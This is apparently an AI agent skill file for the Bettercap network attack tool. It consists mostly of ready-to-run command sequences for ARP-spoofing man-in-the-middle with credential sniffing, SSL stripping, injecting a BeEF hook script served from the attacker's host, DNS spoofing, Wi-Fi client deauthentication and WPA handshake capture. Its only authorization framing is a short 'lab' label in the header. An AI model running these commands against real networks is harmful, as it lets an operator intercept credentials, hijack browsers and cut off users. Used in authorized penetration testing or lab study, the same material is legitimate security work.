---
name: bettercap
description: "Auth/lab ref: Bettercap network lab tooling; Wi-Fi/BLE/HID/Ethernet modules, traffic observation, MITM simulation, auth-exposure checks."
license: GPL-3.0
compatibility: "Linux/macOS; root/sudo often required for network interfaces."
metadata:
  author: AeonDave
  version: "1.1"
---

# Bettercap

Network attack Swiss Army knife: MITM, sniff, spoof.

## Quick Start

```bash
sudo bettercap -iface eth0
sudo bettercap -iface eth0 -caplet http-ui
```

## Core REPL Commands

| Command | Purpose |
|---------|---------|
| `net.probe on` | Discover LAN hosts |
| `net.show` | List discovered hosts |
| `arp.spoof on` | Enable ARP spoofing MITM |
| `set arp.spoof.targets <ip>` | Limit MITM to target |
| `net.sniff on` | Capture credentials/traffic |
| `https.proxy on` | HTTPS with SSL strip |
| `wifi.recon on` | WiFi AP/client discovery |
| `wifi.deauth <mac>` | Deauthenticate client |
| `ble.recon on` | BLE device scan |

## ARP MITM + Credential Sniff

```
sudo bettercap -iface eth0
net.probe on
set arp.spoof.duplex true
set arp.spoof.targets 192.168.1.50
arp.spoof on
net.sniff on
```

## HTTPS Downgrade / SSL Strip

```
set https.proxy.sslstrip true
set arp.spoof.targets 192.168.1.50
arp.spoof on
https.proxy on
net.sniff on
```

> HSTS-protected sites resist SSL strip. Works on non-HSTS HTTPS or HTTP→HTTPS redirects.

## JS Injection (Hook BeEF)

```
set http.proxy.injectjs http://YOUR_IP:3000/hook.js
set arp.spoof.targets 192.168.1.50
arp.spoof on
http.proxy on
```

## DNS Spoofing

```
set dns.spoof.domains target.com,*.target.com
set dns.spoof.address YOUR_IP
dns.spoof on
arp.spoof on
```

## WiFi Workflows

```
# Discover APs and clients
sudo bettercap -iface wlan0
wifi.recon on
wifi.show

# Deauth a client
wifi.deauth <client_mac>

# Deauth all clients from an AP
wifi.deauth <bssid>

# WPA handshake capture (deauth forces reconnect)
set wifi.recon.channel 6
wifi.deauth <bssid>
# Handshakes saved to: /tmp/bettercap-wifi-handshakes.pcap
```

## Caplets (Automation Scripts)

```bash
# Run built-in caplet
sudo bettercap -iface eth0 -caplet http-ui
sudo bettercap -iface eth0 -caplet https-ui
sudo bettercap -iface eth0 -caplet mitm6      # IPv6 MITM

# Custom caplet file (commands, one per line)
sudo bettercap -iface eth0 -caplet my_attack.cap
```

## Resources

| File | When to load |
|------|--------------|
| `references/modules.md` | Full module list, caplet syntax, filter patterns, WiFi attack chains |
